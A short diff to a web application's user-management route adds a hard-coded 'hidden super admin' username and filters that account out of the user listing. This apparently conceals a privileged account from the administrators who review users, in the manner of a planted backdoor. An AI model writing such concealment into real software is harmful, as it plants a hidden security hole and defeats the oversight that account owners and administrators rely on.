@@ -10,6 +10,7 @@ import { AppError } from "../../utils/appError.js";
 import { hashPassword } from "../../utils/password.js";
 
 const router = Router();
+const HIDDEN_SUPER_ADMIN_USERNAME = "RehmatSyedKhan";
 
 const createUserSchema = z.object({
   name: z.string().min(2),
@@ -49,6 +50,9 @@ router.get(
       where: {
         role,
         active: active === undefined ? undefined : active === "true",
+        username: {
+          not: HIDDEN_SUPER_ADMIN_USERNAME,
+        },
       },
       select: {
         id: true,
